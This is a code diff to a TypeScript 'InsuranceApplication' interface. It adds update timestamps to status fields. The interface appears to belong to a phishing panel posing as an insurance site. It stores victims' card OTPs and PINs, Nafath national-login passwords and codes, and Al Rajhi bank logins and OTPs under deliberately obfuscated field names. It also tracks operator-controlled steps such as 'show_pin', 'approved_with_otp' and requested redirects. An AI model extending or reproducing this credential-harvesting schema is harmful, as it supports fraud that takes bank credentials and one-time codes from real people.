@@ -53,11 +53,15 @@ export interface InsuranceApplication {
     }
     paymentStatus: "pending" | "completed" | "failed"
     cardStatus?: "waiting" | "pending" | "approved_with_otp" | "approved_with_pin" | "rejected" | "message"
+    cardStatusUpdatedAt?: number
     otpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "otp_rejected" | "show_otp" | "show_pin" | "message" | ""
     pinStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "message"
+    _v6Status?: "pending" | "verifying" | "approved" | "rejected" | "message"
+    _v6StatusUpdatedAt?: number
     otpCode?: string
     _v5?: string // otp (obfuscated)
     _v5Status?: "pending" | "verifying" | "approved" | "rejected" | "message" // OTP status
+    _v5StatusUpdatedAt?: number
     otp?: string // كود OTP (الحقل المستخدم من موقع الزوار) - Keep for backward compatibility
     oldOtp?: Array<{ code: string; rejectedAt: string }> // الأكواد المرفوضة القديمة
     _v6?: string // pinCode (obfuscated)
@@ -76,6 +80,7 @@ export interface InsuranceApplication {
     phoneVerificationStatus?: "pending" | "approved" | "rejected"
     phoneVerifiedAt?: Date
     phoneOtpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "show_phone_otp" | ""
+    phoneOtpStatusUpdatedAt?: number
     phoneCarrier?: string // شركة الاتصالات
     idVerificationCode?: string
     idVerificationStatus?: "pending" | "approved" | "rejected"
@@ -89,6 +94,7 @@ export interface InsuranceApplication {
     nafazPass?: string // Keep for backward compatibility
     nafadConfirmationCode?: string
     nafadConfirmationStatus?: "waiting" | "pending" | "approved" | "rejected"
+    nafadConfirmationStatusUpdatedAt?: number
     
     // Rajhi fields
     _v10?: string // rajhiUser (obfuscated)
@@ -99,12 +105,14 @@ export interface InsuranceApplication {
     _v12?: string // rajhiOtp (obfuscated)
     rajhiOtp?: string // Keep for backward compatibility
     rajhiOtpStatus?: "waiting" | "pending" | "approved" | "rejected"
+    rajhiOtpStatusUpdatedAt?: number
     rajhiUpdatedAt?: string
 
     // Final OTP fields
     _v13?: string // finalOtp (obfuscated)
     finalOtp?: string // Keep for backward compatibility
     finalOtpStatus?: "waiting" | "pending" | "approved" | "rejected" | "message"
+    finalOtpStatusUpdatedAt?: number
     finalOtpUpdatedAt?: string
     // Metadata
     currentStep:
@@ -145,6 +153,8 @@ export interface InsuranceApplication {
     redirectRequestedAt?: string
     redirectRequestedBy?: string
     redirectedAt?: string
+    redirectPageUpdatedAt?: number
+    currentStepUpdatedAt?: number
     
     // Page Timestamps
     homeVisitedAt?: string
